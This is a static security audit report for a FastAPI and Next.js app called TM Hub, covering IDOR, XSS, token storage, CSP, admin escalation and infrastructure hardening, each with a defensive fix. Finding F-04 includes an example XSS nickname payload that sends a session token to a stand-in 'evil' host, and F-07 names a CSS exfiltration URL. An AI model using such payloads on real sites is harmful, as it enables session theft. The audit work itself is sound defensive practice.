# TM Hub — Security Audit Findings (Static Analysis)

- **Audit type:** Static analysis (read-only). No active probing of production.
- **Scope:** Backend (`api/`), frontend (`frontend/`), infra (Docker, GitHub Actions), dependencies, secrets.
- **Standards:** OWASP Top 10 2021, OWASP API Top 10 2023, OWASP ASVS L2, CWE Top 25 2024, MITRE ATT&CK.
- **Date:** 2026-04-27. Branch: `master`. Audit performed against repo state at HEAD `8d562a2`.
- **Auditor:** Static analysis pipeline (manual review + recon agents + `uvx pip-audit` + `npm audit`).
- **Scans run:** `uvx pip-audit --strict` (Python deps, no vulns), `npm audit --omit=dev` (2 moderate transitive), manual `grep` secret scan (clean — only env-var references).

---

## Executive Summary

TM Hub is a small, well-structured FastAPI + Next.js app with a **good security baseline** for a faction tool: parameterized SQL via repo pattern, Fernet-encrypted API keys at rest, JWT (HS256, no `none` allowed), strong cache headers, comprehensive security headers (CSP, HSTS 2y, frame-ancestors none, X-CTO nosniff), public attack surface narrowed to two endpoints (`/api/keys` registration, `/api/settings/public`).

The two **Critical** findings are both **IDOR (Insecure Direct Object Reference)** in stat-related endpoints: any authenticated faction member can read another player's complete battle-stats history and personal-stats baseline by passing their numeric `player_id` in the URL/query. This leaks high-tier intel about other Masters and undermines the spy/baseline system.

Five **High** findings cluster around two themes: (a) JWTs in `localStorage` make any XSS = full session takeover (frontend has `dangerouslySetInnerHTML` on Torn news feed without sanitisation, plus CSP `'unsafe-inline'` neutralising the main XSS mitigation), and (b) admin escalation has no re-auth — a stolen session token belonging to an admin user automatically yields an admin token.

There are **no exploitable SQL injections, no command injections, no SSRF, no exposed secrets in repo or git history, no critical CVEs in dependencies.** The previously suspected SQLi in `armoury.py:33` was downgraded to "defensive pattern smell" after confirming Pydantic gating in the only two callers.

**Posture:** **B (good baseline, fixable Criticals).** Recommend Critical + High in current sprint; Mediums in next quarter; Low/Info as opportunistic hardening.

### Top 5 risks (priority order)

1. **F-01 IDOR `/api/enemy?baseline_pid=X`** — leaks any registered member's personal-stats baseline. **Fix in 1h.**
2. **F-02 IDOR `/api/stats/snapshots/{pid}` and `/growth/{pid}`** — leaks any player's stat history. **Fix in 2h.**
3. **F-04 `dangerouslySetInnerHTML` on Torn news** — if Torn's news payload contains attacker-influenced HTML (e.g. company name, applicant nickname), full XSS in director panel. **Fix in 1h with `DOMPurify` or sanitiser.**
4. **F-03 Tokens in `localStorage` + F-08 CSP `'unsafe-inline'`** — XSS-amplifier pair. Fix together: HttpOnly cookie + nonce-based CSP. **Fix in 1d.**
5. **F-05 Hardcoded `SUPERADMIN_ID`** — single point of failure (if account compromised, full admin over all encrypted keys). **Fix in 4h: env-var with allowlist + break-glass.**

---

## Threat Model (STRIDE — abridged)

| Component | Spoofing | Tampering | Repudiation | Info Disclosure | DoS | Elevation |
|---|---|---|---|---|---|---|
| `enforce_api_auth` middleware | JWT HS256 + X-Player-Id binding ✓ | JWT signed ✓ | Logs request, no audit-grade trail | — | per-IP rate limit on `/api/keys` only | bypass requires JWT secret |
| `/api/admin/session` | session-token holder lifts to admin | — | logs creation ✓ | — | 5/min/IP ✓ | **F-06: no re-auth on escalation** |
| `/api/enemy`, `/api/stats/*` | — | — | — | **F-01, F-02 IDOR** | — | — |
| `/api/keys` registration | rate-limited per IP ✓ | Fernet at rest ✓ | logs key registration | encrypted at rest ✓ | possible enum via timing — minor | — |
| Frontend AuthGate | client-side gate only | XSS (F-03+F-04) | — | tokens readable by JS | — | — |
| Scheduler jobs | run with full key access | — | logs runs | — | — | full key store access if RCE |
| Docker container | — | runs as root (F-12) | — | — | — | container escape → host root |
| GitHub Actions | tag-pinned actions (F-14) | — | — | secrets via `${{ secrets.* }}` ✓ | — | compromised action → deploy access |

---

## Findings

Severity classification follows CVSS v3.1. Each finding includes: severity, CVSS, CWE, OWASP mapping, file:line, attack description (read-only — no executable PoC per audit scope), impact, fix with concrete code change, verification steps, and defense-in-depth recommendation.

---

### F-01: IDOR — `/api/enemy?baseline_pid=X` exposes any member's personal stats

- **Severity:** **Critical**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **6.5** (raised to **7.7** if treating faction intel as confidential — `S:C`)
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP:** API1:2023 Broken Object Level Authorization
- **Location:** `api/main.py:787-813`

**What's wrong**
Endpoint accepts `baseline_pid` as a query parameter and uses it to fetch *any* registered member's personal-stats baseline via that member's encrypted Torn API key — without verifying that the caller owns or has authority over `baseline_pid`.

```python
# api/main.py:809-813
if baseline_pid:
    user_key = key_store.get_key(baseline_pid)
    if user_key:
        tasks["baseline"] = torn_client.fetch_personalstats(user_key["api_key"])
        baseline_name = user_key["player_name"]
```

**Attack (description only — per audit scope)**
1. Attacker logs in as any faction member (registers their own key, gets a session JWT).
2. Sends `GET /api/enemy?baseline_pid=<victim_pid>` with `X-Player-Id: <attacker_pid>`.
3. Server uses the *victim's* API key to call `torn_client.fetch_personalstats()` and returns the result alongside the enemy faction listing — the response includes the victim's personal-stats numbers used as the threat-baseline.

**Impact**
- High-tier faction intel (every member's battle-stat baseline, networth proxy, gym energy spent) leaked to lower-tier members.
- Trust violation: members register keys with the explicit promise that only their own data is fetched.
- Cross-effect: combined with F-02 (full snapshot history), an attacker reconstructs a complete stats portfolio of any member.

**Fix**
Reject `baseline_pid` unless it equals the authenticated caller. The endpoint already has access to the request context via `Depends(verify_member)`; switch the dependency to one that exposes the player_id and add an equality check.

```python
# api/main.py — change signature + add ownership check
@app.get("/api/enemy")
async def enemy(
    faction_id: int | None = Query(default=None),
    baseline_pid: int | None = Query(default=None),
    x_player_id: int = Header(),
):
    if not key_store.has_key(x_player_id):
        raise HTTPException(status_code=401, detail="Register your API key first")
    if baseline_pid is not None and baseline_pid != x_player_id:
        raise HTTPException(status_code=403, detail="baseline_pid must match the authenticated player")
    # ... rest unchanged; replace `baseline_pid` use with x_player_id
```

(Or simply drop the `baseline_pid` parameter entirely and always use `x_player_id` as the baseline.)

**Verification**
Add a regression test in `tests/test_routes.py`:

```python
async def test_enemy_baseline_pid_must_match_caller(client, registered_keys):
    # caller is player A; baseline_pid points at player B
    headers = {"X-Player-Id": str(A), "Authorization": f"Bearer {jwt_for(A)}"}
    r = await client.get(f"/api/enemy?baseline_pid={B}", headers=headers)
    assert r.status_code == 403
```

**Defense in depth**
- Add an Umami custom event for `403 baseline_mismatch` so attempts surface in analytics.
- Log `WARN` with `pid + attempted_baseline_pid` so security team can review aggregate.

---

### F-02: IDOR — `/api/stats/snapshots/{player_id}` and `/api/stats/growth/{player_id}` expose any player's stat history

- **Severity:** **Critical**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **6.5**
- **CWE:** CWE-639
- **OWASP:** API1:2023
- **Location:** `api/routers/stats.py:52-62`, `api/routers/stats.py:65-75`

**What's wrong**
Both endpoints take `player_id` as a path parameter and return the full snapshot history without any check that the authenticated caller is `player_id` (or an admin viewing aggregate stats).

```python
# api/routers/stats.py:52-58
@router.get("/snapshots/{player_id}")
async def get_snapshots(player_id: int, limit: int = Query(default=365, ge=1, le=3650)):
    if not stats_repo:
        raise HTTPException(status_code=503, detail="Stats not initialized")
    snaps = stats_repo.get_snapshots(player_id, limit=limit)
```

The middleware (`enforce_api_auth`) only checks that the JWT subject equals `X-Player-Id` — it does not check that `X-Player-Id` matches `{player_id}` in the path. Worse: if no snapshots exist, `_ensure_snapshot()` (line 13) **lazy-fetches** stats for the requested player using *that player's* API key — so the endpoint will write stats to the DB on demand for any player_id.

**Attack (description only)**
- `GET /api/stats/snapshots/<victim_id>?limit=3650` returns up to 10 years of daily battle-stat history.
- If snapshots don't exist yet, `_ensure_snapshot()` triggers a fetch using the victim's API key and stores them — the attacker primes the store and reads back.

**Impact**
- Equivalent to F-01 but with longitudinal data: attacker observes weekly stat growth of any member.
- Same trust violation; same intel leak.

**Fix**
Either (a) restrict to `caller == player_id` for non-admins, with admins allowed to view aggregate, or (b) keep the leaderboard public-to-faction and remove the per-player endpoint in favour of `/api/stats/snapshots/me`.

Recommended (a):

```python
# api/routers/stats.py — add ownership check via Header
from fastapi import Header

@router.get("/snapshots/{player_id}")
async def get_snapshots(
    player_id: int,
    limit: int = Query(default=365, ge=1, le=3650),
    x_player_id: int = Header(),
):
    if player_id != x_player_id and not key_repo.is_admin(x_player_id):
        raise HTTPException(status_code=403, detail="You can only view your own snapshots")
    # ... rest unchanged
```

Apply the same gate to `get_growth` (line 65).

**Verification**
- Test: caller A requesting `/api/stats/snapshots/B` returns 403 unless A is admin.
- Test: caller A requesting `/api/stats/snapshots/A` returns 200.
- Test: admin caller requesting any player_id returns 200.

**Defense in depth**
- Move `_ensure_snapshot()` lazy-fetch behind the same authorization gate.
- Add audit log entry on every cross-player stats read by an admin (so admins are accountable).
- Rate-limit per-caller snapshot reads to discourage scraping (e.g. 30 reads/min).

---

### F-03: Session/admin JWTs in `localStorage` — XSS = full account takeover

- **Severity:** **High**
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N` = **7.5** (when chained with any XSS, including F-04)
- **CWE:** CWE-922 (Insecure Storage of Sensitive Information)
- **OWASP:** A02:2021 Cryptographic Failures, A03:2021 Injection (chain)
- **Location:**
  - `frontend/src/lib/api-client.ts:12-17` (sessionToken)
  - `frontend/src/hooks/useAdminSession.ts:50` (adminToken)

**What's wrong**
Both session and admin JWTs are stored in `localStorage`, accessible to any JavaScript that runs in the origin. Any XSS — including F-04 (`dangerouslySetInnerHTML` on Torn news) or any future inline-script injection (allowed by the `'unsafe-inline'` CSP, F-08) — can `localStorage.getItem("sessionToken")` and exfiltrate the bearer token. The token then works from any IP/device until `exp + 24h`.

```ts
// frontend/src/lib/api-client.ts:12-14
export function getSessionToken(): string | null {
  if (typeof window === "undefined") return null;
  return localStorage.getItem("sessionToken");
}
```

**Attack (description)**
1. XSS payload runs in director's browser (via F-04 or any other XSS).
2. Payload reads `localStorage.getItem("sessionToken")` and POSTs to attacker server.
3. Attacker uses the JWT from any client, full session access until expiry. If victim is admin, attacker calls `POST /api/admin/session` (F-06) and gets an admin token too.

**Impact**
- Full account takeover for any compromised user; full faction admin if compromised user is admin.
- No backend revocation (F-15) — token is valid until expiry.

**Fix (architecture change — 1d)**
Move session and admin tokens to **HttpOnly + Secure + SameSite=Strict cookies** issued server-side. Frontend stops touching tokens; `apiFetch()` relies on cookie auto-attach. Requires:

1. Backend: on `POST /api/keys` and `POST /api/admin/session`, set `Set-Cookie: sessionToken=...; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=86400` instead of returning the token in the body.
2. Backend: `enforce_api_auth` middleware reads the cookie instead of `Authorization` header (or accepts both during a transition window).
3. Frontend: drop `getSessionToken/storeSessionToken`. `apiFetch` always sends `credentials: "include"`.
4. CSRF: SameSite=Strict mitigates CSRF for auth endpoints; for state-changing endpoints add a double-submit CSRF token (now feasible since cookie is HttpOnly).

**Verification**
- After fix, `localStorage` contains only display-state (`myKeyName`, `myKeyRole`) — no `sessionToken`/`adminToken`.
- Manual: copy a session cookie, paste into another browser, observe it works (defeating the point — but proves the cookie is functioning); then check `document.cookie` in DevTools and confirm the cookie is **not visible** (HttpOnly).
- Browser DevTools network tab: `Cookie:` header attached, `Authorization:` header absent.

**Defense in depth**
- Pair with F-08 (CSP nonce-based, no `unsafe-inline`) so even if XSS lands, payload can't run.
- Pair with F-15 (server-side JWT revocation list) so a leaked cookie can be killed.

---

### F-04: `dangerouslySetInnerHTML` on Torn news feed

- **Severity:** **High**
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N` = **7.0** (depends on whether attacker can inject HTML into Torn news)
- **CWE:** CWE-79 (Cross-site Scripting)
- **OWASP:** A03:2021 Injection
- **Location:** `frontend/src/app/company/director/page.tsx:719`

**What's wrong**
The director-only news panel renders Torn API news HTML directly:

```tsx
<span
  className="text-text-secondary flex-1 [&_a]:text-torn-green [&_a]:hover:underline"
  dangerouslySetInnerHTML={{ __html: n.news }}
/>
```

`n.news` originates from `https://api.torn.com/v2/.../company/news` and Torn embeds user-controlled fields (applicant nicknames, company chat, transaction memos depending on news type). If any of those fields land in `news` HTML without sanitisation on Torn's side, attacker-controlled HTML reaches the director's browser.

**Attack (description)**
- Attacker creates a Torn account with nickname containing HTML (e.g. `Alice<img src=x onerror=fetch('//evil/'+localStorage.sessionToken)>`).
- Attacker applies to the victim's company; Torn writes a news entry "Alice...<nick>... applied".
- Director opens TM Hub → company → director, news panel renders the malicious HTML, payload exfiltrates session token (F-03 chain).

**Caveat — verification needed:** Torn's API may already escape HTML in nicknames. The audit cannot test against live API. **Until verified, treat as exploitable** because Torn's nickname constraints have changed historically and stored-XSS via Torn news is a documented past issue.

**Impact**
- XSS in admin/director context → token theft (F-03) → account takeover.
- Stored: payload persists as long as the news entry is in Torn's window.

**Fix**
Sanitise HTML before rendering. Use `DOMPurify`:

```tsx
import DOMPurify from "isomorphic-dompurify";

// frontend/src/app/company/director/page.tsx:717-720
<span
  className="text-text-secondary flex-1 [&_a]:text-torn-green [&_a]:hover:underline"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(n.news, {
      ALLOWED_TAGS: ["a", "b", "i", "em", "strong", "br"],
      ALLOWED_ATTR: ["href", "title"],
      ALLOWED_URI_REGEXP: /^https?:\/\/(www\.)?torn\.com\//,
    }),
  }}
/>
```

(Add `isomorphic-dompurify` to `frontend/package.json`.)

**Verification**
- Insert a test news object containing `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` and confirm neither fires after the sanitiser is applied.
- Confirm legitimate Torn news (links to `torn.com/profiles.php?XID=`) still renders correctly.
- Search rest of codebase for other `dangerouslySetInnerHTML` usages (current scan shows only this one).

**Defense in depth**
- Pair with F-08 (nonce-based CSP) so any sanitiser bypass still can't run inline JS.
- Pair with F-03 (HttpOnly cookies) so even successful XSS can't steal the token.
- Add unit test: render news with malicious payload, assert sanitiser strips it.

---

### F-05: Hardcoded `SUPERADMIN_ID = 2362436`

- **Severity:** **High**
- **CVSS v3.1:** `AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H` = **7.5** (if Bombel's account is compromised)
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Location:** `api/config.py:26`

**What's wrong**

```python
SUPERADMIN_ID: int = 2362436  # Bombel
```

Single hardcoded numeric ID with full superadmin powers (promote/demote admins, refresh avatars, view all keys metadata). No backup superadmin, no break-glass account, no env-var override. If Bombel's Torn account is ever compromised — phishing, credential reuse, Torn-side breach — the attacker walks straight in: registers their own key from Bombel's account, gets a member token, calls `POST /api/admin/session`, gets admin token with `role: superadmin`, has unrestricted access.

**Attack (description)**
- Attacker compromises the Torn account of player_id=2362436 by any means (Torn-side phishing).
- Attacker registers a new API key on TM Hub via `POST /api/keys` with the compromised key.
- Backend issues a session JWT with `sub=2362436`. Attacker calls `POST /api/admin/session`, gets admin token, role superadmin.
- Attacker can now: list all keys' metadata, delete any key, promote new admins, change app settings.

**Impact**
- Total faction admin compromise via single Torn account.
- No way to revoke superadmin powers without code change + redeploy.

**Fix**
Move `SUPERADMIN_ID` to env-var with allowlist support; keep it as the source of truth for "who can promote admins" but allow a list:

```python
# api/config.py
_superadmin_ids_raw = os.environ.get("SUPERADMIN_IDS", "2362436")
SUPERADMIN_IDS: frozenset[int] = frozenset(
    int(x.strip()) for x in _superadmin_ids_raw.split(",") if x.strip().isdigit()
)
SUPERADMIN_ID: int = next(iter(sorted(SUPERADMIN_IDS)))  # backward compat for existing call sites
```

Update `admin.py:47, 73` and `armoury.py:121, 134, 158` and any other `== SUPERADMIN_ID` to `in SUPERADMIN_IDS`. Set `SUPERADMIN_IDS=2362436,<backup-id>` in Coolify env.

**Verification**
- Deploy with `SUPERADMIN_IDS=2362436,123` — confirm both 2362436 and 123 see superadmin actions.
- Test: a non-listed admin attempts `promote_admin` → 403.

**Defense in depth**
- Add audit log for every superadmin-only action (F-19).
- Rotate Bombel's Torn account credentials; enable Torn 2FA; ensure password manager.
- Out-of-band notification (push/email) on superadmin actions.

---

### F-06: Admin escalation without re-authentication

- **Severity:** **High**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **8.1** (when chained with F-03)
- **CWE:** CWE-287 (Improper Authentication)
- **OWASP:** A07:2021
- **Location:** `api/admin.py:62-80`

**What's wrong**
`POST /api/admin/session` upgrades a session JWT to an admin JWT for any user with `is_admin == True` in DB. There is no second-factor, no re-auth (no password challenge — but the system has no passwords at all, only Torn API keys + JWT). The IP-based 5-req/min rate-limit doesn't help once a token is stolen.

```python
# api/admin.py:62-80
@router.post("/session")
async def create_session(request: Request):
    # ... rate-limit check ...
    payload = require_bearer_token(..., allowed_token_types=(TOKEN_TYPE_SESSION,))
    player_id = payload["sub"]
    if player_id != SUPERADMIN_ID and not _key_store.is_admin(player_id):
        raise HTTPException(status_code=403, detail="Not an admin")
    # ... issues admin token directly ...
```

So a stolen session token (F-03) belonging to *any* admin user instantly yields an admin token.

**Attack (description)**
- F-03 chain: XSS → exfiltrate `sessionToken` of an admin.
- Attacker calls `POST /api/admin/session` with the stolen token → receives `adminToken`.
- All admin endpoints accessible until expiry.

**Impact**
- Removes the "two-step" defence: attacker doesn't need a second compromise to escalate.

**Fix (smaller, immediate)**
Bind the admin token to a fresh proof — re-fetch the user's *current* Torn API key and re-validate it against Torn (the same flow as `POST /api/keys`). If the key changed or Torn returns 403 for it, abort:

```python
# api/admin.py:62-80 — add fresh proof
user_key = _key_store.get_key(player_id)
if not user_key:
    raise HTTPException(status_code=401, detail="No API key registered")
# Fresh proof — verify the key still works against Torn
profile = await _torn_client.fetch_basic_profile(user_key["api_key"])
if not profile or profile.get("player_id") != player_id:
    raise HTTPException(status_code=401, detail="Re-validate your Torn API key")
token = create_jwt(...)
```

**Fix (better, longer)**
Combine with F-03 fix: HttpOnly cookies + a per-action confirmation (e.g. the admin must paste a one-time code from their email/Torn-mail before destructive actions like "delete key" or "promote admin"). This is true second-factor.

**Verification**
- Test: stolen session token from admin user → if Torn API key revoked between login and escalation, `/api/admin/session` returns 401.
- Test: legitimate admin session → escalation still succeeds.

**Defense in depth**
- Audit log per admin action (F-19).
- Push notification to admin's PDA on `POST /api/admin/session` ("admin session opened from IP X.Y.Z.W").

---

### F-07: CSP allows `'unsafe-inline'` for scripts and styles

- **Severity:** **High**
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` = **5.6** (mitigation downgrade, not direct exploit)
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
- **OWASP:** A05:2021 Security Misconfiguration
- **Location:** `api/main.py:548-559`

**What's wrong**

```python
"script-src 'self' 'unsafe-inline' https://analityka.tri.ovh; "
"style-src 'self' 'unsafe-inline'; "
```

`'unsafe-inline'` for `script-src` defeats the primary CSP XSS mitigation: any successful HTML injection (F-04 or future ones) can run `<script>` and `<img onerror>` inline. The `style-src 'unsafe-inline'` is less critical but enables CSS-injection-based data exfiltration (`background-image: url(//evil/?leak=...)`).

**Fix**
Move to nonce-based CSP. Generate a per-response nonce and add it to inline scripts that must remain inline (analytics, hydration). Drop `'unsafe-inline'` once all inline scripts are nonced.

```python
# api/main.py — nonce per response
import secrets

@app.middleware("http")
async def enforce_api_auth(request: Request, call_next):
    # ...
    nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = nonce
    response = await call_next(request)
    response.headers.setdefault(
        "Content-Security-Policy",
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://analityka.tri.ovh; "
        f"style-src 'self' 'nonce-{nonce}'; "
        # ... rest unchanged ...
    )
```

For Next.js static export, this requires either:
- Server-side delivery of the nonce (incompatible with `output: "export"`), **or**
- Drop inline scripts entirely (Next.js 15 `output: "export"` already mostly does — verify with `grep -r "<script" frontend/src/`), and use only `'self'` + the analytics origin.

Recommended: audit `frontend/src/app/layout.tsx` and any `<Script strategy="beforeInteractive" />` for inline-ness; if all scripts are external `<script src>`, drop `'unsafe-inline'` entirely with no nonce.

For inline styles: Tailwind generates a static stylesheet; React inline styles (`style={{...}}`) compile to inline `style="..."` *attributes*, not `<style>` blocks — those are governed by `style-src-attr`, not `style-src`. Adding `style-src-attr 'unsafe-inline'; style-src 'self'` may be safe.

**Verification**
- Browser DevTools → Console: confirm no CSP violations after dropping `'unsafe-inline'` from `script-src`.
- Run `npm run build && npx serve frontend/out` locally with the new CSP header injected via a tiny proxy; navigate every page; check console.

**Defense in depth**
- Add `report-uri` (or `report-to`) to capture CSP violations in production.
- Add `require-trusted-types-for 'script'` once feasible (eliminates DOM-XSS sinks like `innerHTML` at the browser level).

---

### F-08: WebSocket session token in query string

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` = **3.7**
- **CWE:** CWE-598 (Information Exposure Through Query Strings)
- **OWASP:** A02:2021
- **Location:** `frontend/src/hooks/useChat.ts:254`

**What's wrong**

```ts
const ws = new WebSocket(`${proto}//${window.location.host}/api/chat/ws?token=${encodeURIComponent(token)}`);
```

Tokens in URLs leak into:
- Browser history (less impactful for WebSocket URLs but technically present).
- nginx access logs (the WebSocket upgrade request URL is logged).
- Any reverse proxy / WAF logs upstream of nginx.
- Anyone with shoulder-surfing access to DevTools Network tab.

Same-origin slightly mitigates external leakage (no Referer to other origins), but log-leakage remains.

**Fix**
Use `Sec-WebSocket-Protocol` to carry the token (browsers allow custom subprotocols in `new WebSocket(url, protocols)`):

```ts
// frontend/src/hooks/useChat.ts:254 — pass token as subprotocol
const ws = new WebSocket(
  `${proto}//${window.location.host}/api/chat/ws`,
  [`bearer.${encodeURIComponent(token)}`],
);
```

Backend (`api/routers/chat.py` WebSocket handler) reads `websocket.scope["subprotocols"]`, extracts the bearer prefix, validates JWT, accepts with the same subprotocol echoed back.

Or pair with F-03 fix: HttpOnly cookie auto-attaches to WebSocket upgrade.

**Verification**
- nginx access log no longer contains `?token=...` in the upgrade URL.
- WebSocket still authenticates and chat works.

**Defense in depth**
- Truncate or scrub `?token=` from nginx logs in `nginx.conf` log format.
- Rotate JWTs more aggressively (shorter `exp`).

---

### F-09: Missing `rel="noopener noreferrer"` on `target="_blank"` links

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:N/A:N` = **3.5**
- **CWE:** CWE-1022 (Use of Web Link to Untrusted Target with `window.opener` Access)
- **OWASP:** A05:2021
- **Locations (per recon):**
  - `frontend/src/app/revives/page.tsx:144, 185, 190`
  - `frontend/src/app/targets/page.tsx:227, 243`

**What's wrong**
Each `<a target="_blank" href="https://torn.com/...">` allows the opened tab to call `window.opener.location = "https://phish.example/torn-login"` (reverse tabnabbing). On modern browsers (Chrome 88+, Firefox 79+, Safari 12.1+) `noopener` is implicit for `target="_blank"`, but a stale browser or older webview can still be vulnerable.

**Fix**
Add `rel="noopener noreferrer"` to all `<a target="_blank">` in those files (and audit others):

```tsx
<a href="https://www.torn.com/profiles.php?XID=..." target="_blank" rel="noopener noreferrer">…</a>
```

Optionally add an ESLint rule to enforce it project-wide:

```json
// frontend/.eslintrc.json
"rules": { "react/jsx-no-target-blank": ["error", { "enforceDynamicLinks": "always" }] }
```

**Verification**
- `cd frontend && npm run lint` after adding the rule reports zero violations.
- Manual: open a target link in dev, confirm `window.opener` is `null` in the new tab's console.

**Defense in depth**
- ESLint rule above prevents regression.

---

### F-10: F-string SQL pattern in repos (currently safe; pattern smell)

- **Severity:** **Medium** (Defense-in-depth; no current exploit)
- **CVSS v3.1:** `AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` = **5.5** (if pattern regresses)
- **CWE:** CWE-89 (SQL Injection)
- **OWASP:** A03:2021
- **Locations:**
  - `api/db/repos/armoury.py:28-33` — `update_competition(comp_id, **kwargs)`
  - `api/db/repos/targets.py:40` — partial UPDATE
  - `api/db/repos/chat.py:49` — has whitelist; safe but same shape

**What's wrong (and why it's *not* Critical)**
Each repo builds an UPDATE statement via f-string from `kwargs` keys:

```python
# api/db/repos/armoury.py:28-33
def update_competition(self, comp_id: int, **kwargs) -> None:
    if not kwargs:
        return
    cols = ", ".join(f"{k} = ?" for k in kwargs)
    vals = tuple(kwargs.values()) + (comp_id,)
    self.mutate(f"UPDATE armoury_competitions SET {cols} WHERE id = ?", vals)
```

I confirmed both callers:
- `api/routers/armoury.py:139-150` — `body.model_dump()` of the Pydantic `UpdateCompetition` model with statically-named fields → **safe**.
- `api/mcp/tools/competitions.py:82-96` — manually constructs `kwargs` from a fixed list of names → **safe**.

So no current exploit. But the pattern is a regression hazard: a future contributor adding a new caller that passes user-controlled keys (e.g. `**request.json()`) immediately gets SQLi.

**Fix**
Refactor to explicit columns. The clarity benefit outweighs the loss of brevity:

```python
# api/db/repos/armoury.py — explicit method
def update_competition(
    self,
    comp_id: int,
    *,
    name: str | None = None,
    category: str | None = None,
    items: str | None = None,
    start_ts: int | None = None,
    end_ts: int | None = None,
    prize_text: str | None = None,
) -> None:
    fields: list[str] = []
    vals: list = []
    if name is not None: fields.append("name = ?"); vals.append(name)
    if category is not None: fields.append("category = ?"); vals.append(category)
    if items is not None: fields.append("items = ?"); vals.append(items)
    if start_ts is not None: fields.append("start_ts = ?"); vals.append(start_ts)
    if end_ts is not None: fields.append("end_ts = ?"); vals.append(end_ts)
    if prize_text is not None: fields.append("prize_text = ?"); vals.append(prize_text)
    if not fields: return
    vals.append(comp_id)
    self.mutate(f"UPDATE armoury_competitions SET {', '.join(fields)} WHERE id = ?", tuple(vals))
```

Apply equivalent refactor to `targets.py` and `chat.py`.

**Verification**
- Existing tests in `tests/test_armoury_*.py` still pass.
- `grep -nE "\\.mutate\\(f\"" api/db/repos/` returns zero matches.

**Defense in depth**
- Add `ruff` rule or pre-commit hook flagging `f"...{...}..."` in argument-0 of `mutate()`/`execute()`.
- Add a `semgrep` rule: any string-formatted SQL in `api/db/` triggers a comment-only finding for review.

---

### F-11: Container runs as root

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` = **6.4** (only matters in a container-escape scenario)
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **OWASP:** A05:2021
- **Location:** `Dockerfile:10` (no `USER` directive)

**What's wrong**
The runtime stage has no `USER` directive, so uvicorn + nginx run as root. If any RCE in the Python app or a vuln in nginx leads to a container escape (rare but documented historically), the attacker runs as root on the Coolify host.

**Fix**

```dockerfile
# Dockerfile — after CMD prep
RUN useradd -r -u 1001 -g root -d /app -s /sbin/nologin appuser \
    && chown -R appuser:root /app /var/log/nginx /var/lib/nginx
USER appuser
EXPOSE 8000
CMD ["./start.sh"]
```

Caveat: nginx needs to bind port 80/443 — but in this Dockerfile only 8000 is exposed and Coolify proxies in front, so nginx in the container can listen on a high port. Verify `nginx.conf` listens on a port >1024.

**Verification**
- `docker exec <container> id` shows uid=1001, not 0.
- App still serves; nginx reverse-proxy works.

**Defense in depth**
- In `docker-compose.yml`, add `read_only: true` and `tmpfs: /tmp,/var/cache/nginx` for further hardening.
- Add `cap_drop: [ALL]` and `cap_add: [NET_BIND_SERVICE]` only if needed.

---

### F-12: Umami analytics script loaded without Subresource Integrity

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` = **6.0** (only if `analityka.tri.ovh` is compromised)
- **CWE:** CWE-353 (Missing Support for Integrity Check)
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **Location:** `frontend/src/app/layout.tsx:38-42`

**What's wrong**
The analytics script is loaded from `https://analityka.tri.ovh/script.js` without an SRI hash. Per memory, `tri.ovh` is owned (Umami self-hosted), but compromise of that subdomain or DNS would let an attacker swap the script and run arbitrary code in every TM Hub user's browser.

**Fix**
Either compute and pin SRI:

```tsx
<Script
  src="https://analityka.tri.ovh/script.js"
  data-website-id="c2fb3dc3-de09-432a-8332-d9ad51940c55"
  strategy="lazyOnload"
  integrity="sha384-<hash>"
  crossOrigin="anonymous"
/>
```

Or self-host the Umami collector script in `frontend/public/script.js` so it's served same-origin (no SRI needed; `'self'` in CSP suffices).

**Verification**
- DevTools → Network → `script.js` request shows `integrity` matches; if the file changes upstream, the browser blocks it.
- After rotating the SRI hash on Umami upgrade, run a deploy + smoke test.

**Defense in depth**
- Lock down DNS and registrar account for `tri.ovh` with 2FA + transfer lock.
- Add CSP `report-uri` to detect script-load failures.

---

### F-13: GitHub Actions pinned by tag, not SHA

- **Severity:** **Medium**
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` = **6.0** (supply chain — only if action is compromised)
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **OWASP:** A08:2021
- **Location:** `.github/workflows/deploy.yml:12, 13, 16`

**What's wrong**
Actions are pinned by mutable tags (`actions/checkout@v4`, `astral-sh/setup-uv@v4`, `actions/setup-node@v4`). A compromised maintainer can re-point the tag to a malicious commit, which gets pulled silently on next workflow run. With access to `secrets.COOLIFY_TOKEN`, the malicious action exfils the token and can deploy arbitrary code to production.

**Fix**
Pin by full commit SHA + add `dependabot` to surface upstream updates with manual review:

```yaml
# .github/workflows/deploy.yml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
- uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86  # v4.1.0
